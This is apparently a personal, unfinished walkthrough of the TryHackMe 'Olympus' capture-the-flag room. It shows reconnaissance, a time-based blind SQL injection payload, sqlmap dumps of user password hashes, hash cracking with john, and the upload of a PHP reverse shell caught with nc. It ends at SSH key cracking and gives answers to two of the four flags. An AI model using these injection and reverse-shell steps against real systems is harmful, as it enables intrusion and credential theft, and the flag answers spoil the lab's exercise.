<p align="center"><img width="80px" src=""><br>
June 17, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure,<br>
part of my <code>407</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
My first CTF ! <br>Click <a href="https://tryhackme.com/room/olympusroom">here</a>to access the "room".<br>
<img width="1200px" src="e"></p>

<h2> Task 1 . Connection</h2>

<h3 align="left"> Answer the question below</h3>

> 1.1. <em>Start the VM</em><br><a id='1.1'></a>
>> <strong><code>No answer needed</code></strong><br>
<p></p>

<br>

<h2>Task 2 . Flag submission</h2>

<h3 align="left"> Answer the questions below</h3>

> 2.1. <em>What is Flag 1?</em><br><a id='2.1'></a>
>> <strong><code>flag{Sm4rt!_k33P_d1gGIng}</code></strong><br>
<p></p>

<br>

> 2.2. <em>What is Flag 2??</em><br><a id='2.2'></a>
>> <strong><code>flag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}</code></strong><br>
<p></p>

<br>

> 2.3. <em>What is Flag 3?</em><br><a id='2.3'></a>
>> <strong><code>____</code></strong><br>
<p></p>

<br>

> 2.4. <em>What is Flag 4?</em><br><a id='2.4'></a>
>> <strong><code>____</code></strong><br>
<p></p>

<br>

<h3>nmap</h3>

```bash
:~# nmap -sS TargetIP
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

```bash
:~# nmap -sC -sV -Pn -p- -T4 TargetIP
...
PORT   STATE SERVICE VERSION
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://olympus.thm
...
```

```bash
TargetIP olympus.thm
```

<h3>dirsearch</h3>

```bash
:~# dirsearch -u http://olympus.thm/ -i200,301,302,401 -w /usr/share/dirb/wordlists/common.txt
...
Target: http://olympus.thm/

Starting: 
301 -  315B  - /~webmaster  ->  http://olympus.thm/~webmaster/
301 -  315B  - /javascript  ->  http://olympus.thm/javascript/
301 -  311B  - /static  ->  http://olympus.thm/static/

Task Completed
```

```bash
:~# dirsearch -u http://olympus.thm/~webmaster/ -i200,301,302,401 -w /usr/share/dirb/wordlists/common.txt
...
Starting: ~webmaster/
301 -  321B  - /~webmaster/admin  ->  http://olympus.thm/~webmaster/admin/
301 -  319B  - /~webmaster/css  ->  http://olympus.thm/~webmaster/css/
301 -  321B  - /~webmaster/fonts  ->  http://olympus.thm/~webmaster/fonts/
301 -  319B  - /~webmaster/img  ->  http://olympus.thm/~webmaster/img/
301 -  324B  - /~webmaster/includes  ->  http://olympus.thm/~webmaster/includes/
301 -  318B  - /~webmaster/js  ->  http://olympus.thm/~webmaster/js/
200 -    1KB - /~webmaster/LICENSE

Task Completed
```

```bash
:~# dirsearch -u http://olympus.thm/~webmaster/admin/ -i200,301,302,401 -w /usr/share/dirb/wordlists/common.txt
...
Starting: ~webmaster/admin/
301 -  325B  - /~webmaster/admin/css  ->  http://olympus.thm/~webmaster/admin/css/
301 -  327B  - /~webmaster/admin/fonts  ->  http://olympus.thm/~webmaster/admin/fonts/
301 -  330B  - /~webmaster/admin/includes  ->  http://olympus.thm/~webmaster/admin/includes/
301 -  325B  - /~webmaster/admin/img  ->  http://olympus.thm/~webmaster/admin/img/
301 -  324B  - /~webmaster/admin/js  ->  http://olympus.thm/~webmaster/admin/js/

Task Completed
:~# 
```

<h3>http://olympus.thm</h3>
<p>- Olympus v2<br>
- under developpment<br>
- root@the-it-department</p>

![image](https://github.com/user-attachments/assets/6c601d90-db9c-45d3-b864-05949c980b7a)

<h3>http://olympus.thm/~webmaster/admin/ --> http://olympus.thm/~webmaster/index.php</h3>
<p>- Gods and Godess<br>
- 900 * 300<br>
- wordlist<br>
- Victor Alagwu
</p>

![image](https://github.com/user-attachments/assets/6f783828-a123-4b54-8c76-8b31f47449cc)

![image](https://github.com/user-attachments/assets/cd6ba025-f71a-448b-9e41-58a803329f94)

<h3>Burp Suite</h3>

![image](https://github.com/user-attachments/assets/7d40c041-4db0-4458-a81d-c053b3468fa6)

<p>saved <code>re</code></p>


<h3>sqlmap</h3>
<p>- <code>user_id</code> : <code>3</code><br>
- <code>user_name</code> : <code>prometheus</code><br>
- <code>user_firstname</code> : <code>prometheus</code><br>
- <code>user_lastname</code> : <code> </code><br>
- <code>user_email</code> : <code>prometheus@olympus.thm</code><br>
- <code>user_role</code> : <code>User</code><br>
- <code>user_password</code> : <code>$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C</code><br><br>

- <code>user_name</code> : <code>root</code><br> </p>

```bash
:~# sqlmap -r re --dump -batch
...
sqlmap identified the following injection point(s) with a total of 145 HTTP(s) requests:
---
Parameter: user_name (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user_name=admin' AND (SELECT 4441 FROM (SELECT(SLEEP(5)))uMcZ) AND 'SfSs'='SfSs&user_password=admin&login=
---
...
[INFO] the back-end DBMS is MySQL
...
back-end DBMS: MySQL >= 5.0.12
...
[INFO] fetching tables for database: 'olympus'
[INFO] fetching number of tables for database 'olympus'
[INFO] retrieved: 6
[INFO] retrieved: categories
[INFO] retrieved: chats
[INFO] retrieved: comments
[INFO] retrieved: flag
[INFO] retrieved: posts
[INFO] retrieved: users
[INFO] fetching columns for table 'users' in database 'olympus'
[INFO] retrieved: 9
[INFO] retrieved: user_id
[INFO] retrieved: user_name
[INFO] retrieved: user_firstname
[INFO] retrieved: user_lastname
[INFO] retrieved: user_password
[INFO] retrieved: user_email
[INFO] retrieved: user_image
[INFO] retrieved: user_role
[INFO] retrieved: randsalt
[INFO] fetching entries for table 'users' in database 'olympus'
[INFO] fetching number of entries for table 'users' in database 'olympus'
[INFO] retrieved: 3
...
[INFO] retrieved: prometheus@olympus.thm
[INFO] retrieved: prometheus
[INFO] retrieved: 3
[INFO] retrieved:
[INFO] retrieved:
[INFO] retrieved: prometheus
[INFO] retrieved: $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C
[INFO] retrieved: User
[INFO] retrieved: dgas
[INFO] retrieved: root@chat.olympus.thm
[INFO] retrieved: root
[INFO] retrieved: 6
[INFO] retrieved:
[INFO] retrieved:
[INFO] retrieved: root
[INFO] retrieved: $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK
[INFO] retrieved: Admin
[INFO] retrieved: dgas
...

```

![image](https://github.com/user-attachments/assets/b22f11e1-1caa-437f-b828-c3a1322e50b2)

![image](https://github.com/user-attachments/assets/2dca96ec-1fe2-4e2b-9563-c806da479d93)

![image](https://github.com/user-attachments/assets/c07efc5e-0af4-4508-9aed-e960b25a8878)


```bash
:~# sqlmap -r re --dump --batch -T flag -D olympus
...

```

![image](https://github.com/user-attachments/assets/54dfccdd-5754-49e7-8f38-bae3f4d20303)


<h3>/etc/hosts</h3>

```bash
TargetIP olympus.thm chat.olympus.thm
```

<h3>john</h3>

<p><code>prometheus</code> : <code>summertime</code></p>

```bash
:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash3
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
summertime       (?)
...
Session completed. 
```

![image](https://github.com/user-attachments/assets/e78e8267-2c20-4378-ac64-3c3f08daf286)

![image](https://github.com/user-attachments/assets/dc62a3df-e319-4df1-a355-cfda870854ae)


<h3>dirsearch</h3>

```bash
:~# :~# dirsearch -u http://chat.olympus.thm/  -i200,301,302,401 -w /usr/share/dirb/wordlists/common.txt
...
301 -  325B  - /javascript  ->  http://chat.olympus.thm/javascript/
301 -  321B  - /static  ->  http://chat.olympus.thm/static/
301 -  322B  - /uploads  ->  http://chat.olympus.thm/uploads/

Task completed
```

![image](https://github.com/user-attachments/assets/69ce1870-cbeb-48ab-86d1-71dd3f3cb792)

<p>Attached: prometheus_password.txt</p>

![image](https://github.com/user-attachments/assets/3cd7b1b6-a722-4ac3-aaa3-5de950556eea)

<h3>PentestMonkey Reverse Shell --> <code>rev.php</code></h3>

<p>https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php</p>

![image](https://github.com/user-attachments/assets/f7d90d1b-001d-42f0-a2bb-76e78d67ce6a)

<h3>sqlmap</h3>

<p><code>rev.php</code> : <code>2022</code><br>
<code>prometheus_password.txt</code> : <code>47c3210d51761686f3af40a875eeaaea.txt</code></p>

```bash
:~# sqlmap -r req --dump -batch -T chats -D olympus
...
[INFO] retrieved: msg
[INFO] retrieved: dt
[INFO] retrieved: file
[INFO] fetching entries for table 'chats' in database 'olympus'
[INFO] fetching number of entries for table 'chats' in database 'olympus'
[INFO] retrieved: 5
[WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                              
47c3210d51761686f3af40a875eeaaea.txt
[02:14:07] [INFO] retrieved: 2022-04-05
[INFO] 
```



![image](https://github.com/user-attachments/assets/53258255-f22f-4c63-8d9b-a67221662a52)



```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" -D olympus -T chats --dump
...
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
| dt         | msg                                                                                                                                                             | uname      | file                                 |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | prometheus | 47c3210d51761686f3af40a875eeaaea.txt |
...
| 2025-06-18 | Attached : rev.php                                                                                                                                              | prometheus | fb3bcb27fc5502af28a726b2d9963ea7.php 
...

```

![image](https://github.com/user-attachments/assets/6ac0243c-1822-404b-98f0-ef3ada967987)


<h3>nc</h3>

```bash
:~# nc -nlvp 9001

```

<h3>[[http://chat.olympus.thm/uploads/.php](http://chat.olympus.thm/uploads/47c3210d51761686f3af40a875eeaaea.txt)](http://chat.olympus.thm/uploads/fb3bcb27fc5502af28a726b2d9963ea7.php)</h3>

![image](https://github.com/user-attachments/assets/07a11003-d729-4579-baa7-68a69f746b10)


![image](https://github.com/user-attachments/assets/9bc31bba-3b83-4498-8783-aa4e967952a7)


<h3></h3>

```bash
www-data@ip-10-10-104-10:/$ ls
bin   dev  home  lib32	libx32	    media  opt	 root  sbin  srv  tmp  var
boot  etc  lib	 lib64	lost+found  mnt    proc  run   snap  sys  usr
www-data@ip-10-10-104-10:/$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/cputils
/usr/bin/sudo
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/pkexec
/usr/bin/su
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/newgrp
/snap/snapd/23771/usr/lib/snapd/snap-confine
/snap/snapd/24505/usr/lib/snapd/snap-confine
/snap/core20/2571/usr/bin/chfn
/snap/core20/2571/usr/bin/chsh
/snap/core20/2571/usr/bin/gpasswd
/snap/core20/2571/usr/bin/mount
/snap/core20/2571/usr/bin/newgrp
/snap/core20/2571/usr/bin/passwd
/snap/core20/2571/usr/bin/su
/snap/core20/2571/usr/bin/sudo
/snap/core20/2571/usr/bin/umount
/snap/core20/2571/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2571/usr/lib/openssh/ssh-keysign
/snap/core20/1518/usr/bin/chfn
/snap/core20/1518/usr/bin/chsh
/snap/core20/1518/usr/bin/gpasswd
/snap/core20/1518/usr/bin/mount
/snap/core20/1518/usr/bin/newgrp
/snap/core20/1518/usr/bin/passwd
/snap/core20/1518/usr/bin/su
/snap/core20/1518/usr/bin/sudo
/snap/core20/1518/usr/bin/umount
/snap/core20/1518/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1518/usr/lib/openssh/ssh-keysign
```


![image](https://github.com/user-attachments/assets/2e1c837a-5e73-4ffb-a2f9-0adefebaa88b)

![image](https://github.com/user-attachments/assets/4b926cf1-3612-4c2b-9f3b-3058fd2a6d00)

:~# nano id_rsa
:~# chmod 600 id_rsa

![image](https://github.com/user-attachments/assets/eb486f0a-75a6-4fcf-8d20-e910a45f6f68)

:~# python3 /opt/john/ssh2john.py id_rsa > zeus
...


![image](https://github.com/user-attachments/assets/5ac3892d-7d2a-4f74-8ed7-d17048be44e6)


